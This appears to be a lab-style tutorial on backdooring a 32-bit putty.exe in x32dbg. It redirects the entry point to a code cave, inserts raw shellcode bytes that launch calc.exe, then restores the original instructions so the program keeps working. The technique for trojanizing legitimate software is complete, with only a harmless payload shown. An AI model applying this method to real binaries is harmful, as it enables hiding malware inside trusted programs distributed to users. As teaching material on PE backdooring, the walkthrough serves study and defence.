# Enumeration

First, debug a 32bit **putty.exe** in x32dbg. There is a inital breakpoint in the binary:
```
Address=00454AD0
Module/Label/Exception=<putty.exe.EntryPoint>
State=One-time
Disassembly=push 60
Hits=0
Summary=entry breakpoint
```

We need to find a **code cave** in the binary. The `.text` section it is executable:
```
Address=00401000
Size=0005C000
Party=User
Page Information=".text"
Content of section=Executable code
Allocation Type=IMG
Current Protection=ER---
Allocation Protection=ERWC-
```

Also, it can be seen at the end of the file a bunch of empty memory. This can be a code cave:

We will add a breakpoint there and copy the address (**0045C961**) for later. We will do a jump from the first instruction (**00454AD0**) to our code cave, and then come back to the main program. Copy the firsts instructions of the program:
```
00454AD0 | 6A 60               | push 60                          |
00454AD2 | 68 B07A4700         | push putty.477AB0                |
00454AD7 | E8 08210000         | call putty.456BE4                |
00454ADC | BF 94000000         | mov edi,94                       | edi:"LdrpInitializeProcess"
00454AE1 | 8BC7                | mov eax,edi                      | edi:"LdrpInitializeProcess"
```

# Code Cave

The first instruction (**00454A**) can be overwrite as simply as selecting and pressing <kdb>Space</kdb> (or right click and `Assemble`). We will change the value to:
```assembly
jmp 0x0045C961
```

Which is the direction of the code cave. Pressing <kdb>Enter</kdb> in **0045C961** will now jump to the code cave.

Now we will overwrite the two first entries of the shellcode to write on the stack with the functions `pushad` and `pushfd`. Select a bunch of lines from the code cave, copy our shellcode, press <kdb>Ctrl</kdb> + <kdb>E</kdb> and paste it. As we can see, our previos empty code cave is now filled with our shellcode. In this case, a 32bit calc.exe:
```
fc e8 82 00 00 00 60 89 e5 31 c0 64
8b 50 30 8b 52 0c 8b 52 14 8b 72 28
0f b7 4a 26 31 ff ac 3c 61 7c 02 2c
20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52
10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1
51 8b 59 20 01 d3 8b 49 18 e3 3a 49
8b 34 8b 01 d6 31 ff ac c1 cf 0d 01
c7 38 e0 75 f6 03 7d f8 3b 7d 24 75
e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b
58 1c 01 d3 8b 04 8b 01 d0 89 44 24
24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a
8b 12 eb 8d 5d 6a 01 8d 85 b2 00 00
00 50 68 31 8b 6f 87 ff d5 bb f0 b5
a2 56 68 a6 95 bd 9d ff d5 3c 06 7c
0a 80 fb e0 75 05 bb 47 13 72 6f 6a
00 53 ff d5 63 61 6c 63 2e 65 78 65
00
```

We can save the state of the binary with <kdb>Ctrl</kdb> + <kdb>P</kdb> and save it as a another PE. If we run the binary now, the shellcode will be executed.

Now we need to find where the calc is being launched. Adding breakpoints to each `call` in the shellcode and executing it show that the **FFD5** in the direction **0045CA06** launch the *calc.exe*. Also, we can found that the last call is the call to exit.

# Retrieving the PE 

Now that we know where our shellcode execute and which is the function that exists (the last `call`), we need to make a jump back to the program. We need to overwrite the `push 0` of our shellcode to jump to another space in the code cave.

Now we need to restore the original flow of the program. The first two lines after the jump will be overwritten by:
```
popfd
popad
```

Take the instructions we overwritten before as hex value:
```
6A 60 68 B0 7A 47 00
```

And replaced the empty code caves after the `popad`. And lastly, jump back to the instruction **00454AD7**. We can see the final output:

# Final

We can see the final work:
